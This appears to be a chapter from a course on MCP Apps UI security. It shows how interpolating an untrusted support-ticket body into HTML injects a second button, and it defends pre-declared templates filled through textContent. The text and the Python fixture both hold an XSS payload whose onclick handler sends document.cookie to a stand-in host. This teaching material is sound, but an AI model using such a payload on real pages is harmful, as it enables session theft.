# 5.1 — 💥 The panel that grew a button

## One-line answer

Interpolate a ticket body into markup and the ticket body becomes markup: the same input that renders
as one Approve button in a declared template renders as **two buttons and an `onclick` handler** when
the page is built per call — and the second button was written by whoever filed the ticket.

## The story

The cheque has two lines for the amount: one in words, one in figures.

You write *Two thousand* on the words line and *2,000* in the box. There is about an inch of empty
paper after *thousand*, and the bank teller who has been doing this for thirty years will not accept
it. She hands it back and asks you to draw a line through the empty inch, or better, to write *Two
thousand only*.

You have not been accused of anything. She is not worried about you. She is worried about the inch,
because an inch of blank paper on a signed cheque is a place where somebody who is not you can write
*five hundred and*, in the same ink, in handwriting nobody will ever compare. The signature is
genuine. The printed lines are genuine. The amount is not.

Nobody fixes this by asking customers to be careful. You fix it by leaving no gap, so that anything
written afterwards is visibly written afterwards.

## The idea in plain language

🎬 **The scene.** A teammate is prototyping the approval panel. Iterating on HTML through a resource
file is slow, so they make the tool build the page and return it: fresh markup on every call, with the
ticket details already in it. It renders. It looks good. *"Ship it, it is just HTML."*

😬 **The naive fix.** Have the host render whatever markup a tool result carries. It is one branch in
the host and it works on the first demo.

💥 **Why it fails.** Ticket 4633's body is a string a stranger typed into a web form. Sutra has treated
that text as untrusted since Day 29, and every defence so far has been about a **model** reading it.
Now a **browser** reads it. The body

```text
Password reset email never arrives. </p><button onclick="fetch('https://drop.example.net/?c='+document.cookie)">Approve all</button><p>
```

closes the paragraph the server opened, opens a button element of its own, and re-opens a paragraph so
the rest of the page still parses. The result is a panel with two Approve buttons on it, one of which
the server wrote and one of which the person filing the ticket wrote, sitting next to each other in
the same font. The human clicks one. There is a fifty per cent chance it is not the server's.

💡 **The insight.** **Declare templates, flow data — never flow templates.** The f-string is the inch
of blank paper: a place inside the document where somebody else's handwriting becomes part of the
document. A pre-declared template has no such place, because the ticket text never enters the markup
at all — it arrives afterwards, as a value, into an element that already exists. It is Day 4's *prose
is a request, a form is a guarantee* with pixels: the template is the form, the payload fills its
boxes, and the click is trustworthy because the thing that was clicked existed, unchanged, before the
ticket did.

## Why Sutra needs it

Because this is the failure that makes MCP Apps' whole design make sense, and without it the
pre-declaration rule reads as bureaucracy.

Every part of section 4 said *the template is registered up front*. That sounds like protocol
tidiness until you see what the alternative produces. The `ui://` resource is not an addressing
convention. It is the mechanism that makes attacker-supplied markup **unspeakable** — there is no
field in an MCP tool result that means "render this", so there is no lane for improvised HTML to
arrive in.

And it is the argument to have with the teammate. Not *"the specification says so"*, which loses, but
*"run this and look at the button count"*, which does not.

## The mechanism

Two functions, same input, from `lab/interpolate.py`:

```python
# A real ticket body. Somebody pasted it into the web form; nobody sanitised anything.
TICKET_BODY = (
    "Password reset email never arrives. "
    "</p><button onclick=\"fetch('https://drop.example.net/?c='+document.cookie)\">Approve all</button><p>"
)


def improvised(body: str) -> str:
    """Build the panel's markup per call, with the ticket text pasted straight in."""
    return f"<html><body><p>{body}</p><button>Approve</button></body></html>"


def declared(body: str) -> tuple[str, str]:
    """Ship the fixed template, and send the ticket text separately, as data."""
    return TEMPLATE, json.dumps({"summary": body})
```

**Line by line:**

- `TICKET_BODY` opens with an ordinary sentence. That is not decoration — a payload that looks like an
  attack gets caught by eye in review, and the ones that matter read like support tickets for the
  first line and a half.
- `</p>` closes a paragraph **this string did not open**. It is closing the one in `improvised`'s
  f-string, which is how the injected element ends up as a sibling of the real button rather than
  nested inside a paragraph.
- `onclick="fetch(...document.cookie)"` is the payload. Whether it succeeds depends on the sandbox and
  the policy from [4.3](../04-a-server-that-draws/4.3-what-the-sandbox-actually-stops.md) — a correct
  `connect-src 'self'` blocks the fetch. **The button still renders**, which is the part no CSP
  addresses.
- The trailing `<p>` re-opens a paragraph so the rest of the document still parses. A malformed page
  might have been noticed; a well-formed one is not.
- `improvised` is an f-string and that is the entire bug. One interpolation, no escaping, and the
  string being interpolated is the only value in the whole system that came from outside.
- `declared` returns **two** things: the template, unchanged, and the body as a JSON value. The body
  never touches markup. It travels as `params.summary` in a `ui/notifications/tool-result` message
  ([4.4](../04-a-server-that-draws/4.4-the-dialect-spoken-through-the-glass.md)) and lands in the page
  through `textContent`.
- `TEMPLATE` is a module constant referenced, not built. That is what makes it hashable, reviewable and
  identical on every call — and it is why `declared` takes `body` and never uses it in the first
  return value.

The template it ships instead:

```html
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Approve</title></head>
<body>
  <p id="body">loading</p>
  <button id="approve">Approve</button>
  <script type="module">
    // the host pushes the tool result in; nothing here builds markup
    window.addEventListener("message", (e) => {
      document.getElementById("body").textContent = e.data.summary;
    });
  </script>
</body></html>
```

**Line by line:**

- `<p id="body">loading</p>` is an **empty container with a name**. There is no ticket text anywhere in
  this file and there never will be; the element exists to be filled.
- One `<button>`, with an `id` and no `onclick`. Behaviour is attached by script, so a reviewer
  counting interactive elements in the markup gets the right answer.
- `<script type="module">` — module scripts are deferred and run in their own scope, so the handler
  cannot be reached or replaced by anything else that ends up on the page.
- `window.addEventListener("message", ...)` receives the host's push. Production code checks
  `e.origin` first, for the reason
  [4.4](../04-a-server-that-draws/4.4-the-dialect-spoken-through-the-glass.md) gives; this file is the
  minimum that shows the data path.
- **`.textContent = e.data.summary`** is the one line that matters. `textContent` sets *text*: the
  browser creates a text node and every `<` in it is a less-than sign. `.innerHTML` would parse the
  same string as markup and reproduce the entire bug inside the "safe" template. One property name is
  the whole difference.

**Line by line:**

- From the repository root. **Zero generations, no network, no browser** — the counting is done on the
  strings, because the point is what the markup *contains*, and that is decidable without rendering.

On 2026-09-04:

```text
A. markup built per call
   buttons in the page : 2
   onclick handlers    : 1
   text the reviewer saw before this rendered: none

B. fixed template, ticket text as data
   buttons in the page : 1
   onclick handlers    : 0
   payload             : {"summary": "Password reset email never arrives. </p><button...

```

**Two buttons against one. One `onclick` against zero.** Same ticket, same server, same user. The
difference is entirely whether the page existed before the ticket did.

Read the `payload` line too. The dangerous string is **still there** in arm B — it has not been
stripped, filtered or blocked. It has been moved out of the position where it is code and into the
position where it is a value, and the `escaped for display` line shows what a browser does with it
once it arrives as text.

## When it breaks

Three ways this comes back after somebody thinks they have fixed it.

**Escaping instead of separating.** Somebody keeps `improvised` and adds `html.escape(body)`. That
closes this exact hole and leaves the shape intact: the template still varies per call, so it still
cannot be pinned, hashed or reviewed ([4.2](../04-a-server-that-draws/4.2-the-template-is-declared-the-data-flows-in.md)),
and the next field somebody interpolates — an attribute value, a URL, a piece of JSON inside a script
tag — needs a different escaping function that nobody will remember to use.

**`innerHTML` inside a correct template.** The template is fixed, registered and reviewed, and the
script fills the placeholder with `.innerHTML` because someone wanted the ticket's line breaks to
render. The bug is now inside the reviewed file, which is worse, because that file has been read and
signed off.

**Markdown rendered to HTML.** Ticket bodies contain Markdown, so the panel runs them through a
converter. Most converters allow raw HTML through by default. The payload above passes untouched, and
the code that did it is one library call that looks like a formatting improvement.

The verbatim symptom is the same in all three cases and it is not an error message. It is arm A's
output: a button count that is one higher than the number of buttons anybody wrote. That is the check
worth automating — assert the number of interactive elements in the rendered document, and fail when
it changes.

## In production

**What a professional writes instead:** a strict split enforced by types. The function that produces a
panel returns `(template_uri, payload_dict)` and cannot return a string of HTML at all, because there
is no code path that concatenates markup. When the only way to get bytes onto a screen is to name a
registered template, injection into markup is not a bug that was avoided — it is a state the program
cannot represent.

**What degrades at scale:** the number of fields, and therefore the number of places somebody can
forget. One summary field is easy to get right. A panel showing a ticket, four duplicates, a customer
name, an account tier and a drafted reply has eight untrusted strings, and the failure only needs one
of them. This is why the defence has to be structural — a rule about where data may go — rather than
a habit of remembering to escape.

**The failure mode that only appears with real traffic:** the payload that is not a string. A field
that is normally a number arrives as an object because an upstream system changed, the page assigns it
into a template literal, and `[object Object]` renders where the count should be. Harmless — until the
same path is used for something an attacker controls the type of. Payloads crossing the bridge need a
schema on the receiving side, and the panel is the receiving side.

**The review comment a senior engineer leaves:** *"the tool returns HTML built from the ticket body.
Run the fixture with the injection payload and count the buttons: there are two, and one of them has an
`onclick` on it. Register the panel as a `ui://` resource, send the ticket as a JSON payload, and set
it with `textContent` — and add the assertion on the interactive-element count, because this will be
reintroduced the first time somebody wants the line breaks to render."*

**The interview question:** *"a tool wants to show the user a formatted ticket. What is the risk?"* The
answer: *"That the ticket body is attacker-controlled text and you are about to put it somewhere a
browser parses. We measured it: the same body rendered through a per-call template produced two Approve
buttons and one `onclick` handler, and through a pre-declared template with the body sent as data it
produced one button and zero handlers. The important detail is that the payload is not filtered in the
safe version — it is still there in full — it is just in a position where it is a value instead of
code, set with `textContent` rather than `innerHTML`. And escaping alone would not have been enough,
because a template that varies per call still cannot be hashed, pinned or reviewed, so you lose every
property that made pre-declaring the template worth doing. The rule I would state is: declare
templates, flow data, never flow templates."*
